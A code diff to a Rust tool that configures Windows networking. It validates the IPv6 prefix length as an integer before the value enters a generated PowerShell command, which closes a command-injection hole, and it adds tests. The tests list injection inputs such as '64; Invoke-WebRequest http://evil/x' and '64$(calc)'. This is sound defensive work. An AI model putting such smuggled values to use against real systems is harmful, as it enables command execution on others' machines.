@@ -80,6 +80,16 @@ fn netsh_line(args: &[&str]) -> String {
     )
 }
 
+/// `-PrefixLength` 只接受整数。在配置进入 PowerShell 之前把 `v6prefix` 收敛成数字：
+/// 既给出明确的中文报错，也彻底排除了向 `-PrefixLength` 后面追加 PowerShell 语句的可能。
+fn parse_prefix_len(s: &str) -> Result<String, String> {
+    match s.trim().parse::<u32>() {
+        Ok(n) if n <= 128 => Ok(n.to_string()),
+        Ok(n) => Err(format!("v6prefix 超出合法范围 (0-128)：{}", n)),
+        Err(_) => Err(format!("v6prefix 必须是 0-128 的整数，收到：{}", s)),
+    }
+}
+
 /// 标准 base64 编码（自带实现，避免为一个小工具引入依赖）。
 fn base64_encode(data: &[u8]) -> String {
     const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -447,10 +457,10 @@ impl WinOp {
                  New-NetIPAddress -InterfaceAlias {} -IPAddress {} -PrefixLength {} -DefaultGateway {} -ErrorAction Stop | Out-Null;",
                 psq(iface),
                 psq(iface),
-                psq(iface),
-                psq(addr),
-                prefix,
-                psq(gw)
+                 psq(iface),
+                 psq(addr),
+                 psq(prefix),
+                 psq(gw)
             ),
             WinOp::RouteAdd {
                 iface,
@@ -558,7 +568,8 @@ impl NetworkPlatform for WindowsPlatform {
             }),
             Some(V6Mode::Manual) => {
                 let addr = p.ipv6.clone().ok_or("v6 manual 缺 ipv6")?;
-                let prefix = p.v6prefix.clone().ok_or("v6 manual 缺 v6prefix")?;
+                let raw = p.v6prefix.clone().ok_or("v6 manual 缺 v6prefix")?;
+                let prefix = parse_prefix_len(&raw)?;
                 let gw = p.v6gateway.clone().ok_or("v6 manual 缺 v6gateway")?;
                 ops.push(WinOp::SetV6Manual {
                     iface: iface.clone(),
@@ -722,6 +733,35 @@ $names = Get-ChildItem -Path $d -Recurse -Filter *.xml -ErrorAction SilentlyCont
             None
         } else {
             Some(list)
+        }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::parse_prefix_len;
+
+    #[test]
+    fn prefix_len_accepts_integers_only() {
+        assert_eq!(parse_prefix_len("64").unwrap(), "64");
+        assert_eq!(parse_prefix_len(" 8 ").unwrap(), "8");
+        assert_eq!(parse_prefix_len("0").unwrap(), "0");
+        assert_eq!(parse_prefix_len("128").unwrap(), "128");
+    }
+
+    #[test]
+    fn prefix_len_rejects_injection_and_out_of_range() {
+        // 关键：这些曾经会被原样插进 `-PrefixLength`，等价于 PowerShell 语句注入
+        for bad in [
+            "64; Invoke-WebRequest http://evil/x",
+            "64\nGet-Process",
+            "64$(calc)",
+            "",
+            "abc",
+            "129",
+            "-1",
+        ] {
+            assert!(parse_prefix_len(bad).is_err(), "accepted bad prefix: {:?}", bad);
         }
     }
 }
